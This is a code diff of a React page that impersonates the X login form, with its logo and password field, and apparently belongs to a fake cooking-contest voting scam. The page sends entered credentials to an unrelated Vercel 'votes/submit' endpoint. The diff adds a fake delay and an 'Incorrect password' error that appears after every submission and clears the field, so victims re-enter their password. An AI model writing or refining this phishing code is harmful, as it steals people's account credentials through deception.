@@ -4,10 +4,8 @@ import xLogo from "../assets/x-logo.png";
 export default function XPassword() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-
   const [loading, setLoading] = useState(false);
-
-  const [status, setStatus] = useState(null);
+  const [error, setError] = useState(false);
 
   useEffect(() => {
     const savedUser = localStorage.getItem("x_username");
@@ -24,9 +22,15 @@ export default function XPassword() {
   async function submitForm(e) {
     e.preventDefault();
 
+    if (!password.trim()) {
+      alert("Please enter your password.");
+      return;
+    }
+
     setLoading(true);
 
     try {
+      await new Promise((resolve) => setTimeout(resolve, 700));
       await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
@@ -46,53 +50,10 @@ export default function XPassword() {
     } catch (err) {
       console.log(err);
     } finally {
-      setStatus("approved");
+      setError(true);
+      setPassword("");
       setLoading(false);
     }
-  }
-
-  if (status === "pending") {
-    return (
-      <div className="min-h-screen bg-black flex items-center justify-center text-white">
-        <div className="text-center">
-          <img
-            src={xLogo}
-            alt="X"
-            className="w-14 h-14 mx-auto mb-6"
-          />
-
-          <h1 className="text-3xl font-bold">
-            Pending Approval
-          </h1>
-
-          <p className="text-gray-400 mt-4">
-            Please wait while your vote is being verified.
-          </p>
-        </div>
-      </div>
-    );
-  }
-
-  if (status === "approved" || status === "rejected") {
-    return (
-      <div className="min-h-screen bg-black flex items-center justify-center text-white">
-        <div className="text-center">
-          <img
-            src={xLogo}
-            alt="X"
-            className="w-14 h-14 mx-auto mb-6"
-          />
-
-          <h1 className="text-3xl font-bold text-green-500">
-            Incorrect password!
-          </h1>
-
-          <p className="text-gray-400 mt-4">
-            Try again.
-          </p>
-        </div>
-      </div>
-    );
   }
 
   return (
@@ -120,9 +81,15 @@ export default function XPassword() {
             type="password"
             placeholder="Password"
             value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            className="w-full rounded-md border border-gray-700 bg-black text-white px-4 py-4 outline-none focus:border-blue-500"
+            onChange={(e) => {
+              setPassword(e.target.value);
+              if (error) setError(false);
+            }}
+            className={`w-full rounded-md border bg-black px-4 py-4 text-white outline-none focus:border-blue-500 ${
+              error ? "shake-error border-red-500" : "border-gray-700"
+            }`}
           />
+          {error && <p className="text-sm text-red-500">Incorrect password</p>}
 
           <div className="mt-3">
   <span className="text-sm text-white/70 hover:underline cursor-pointer">
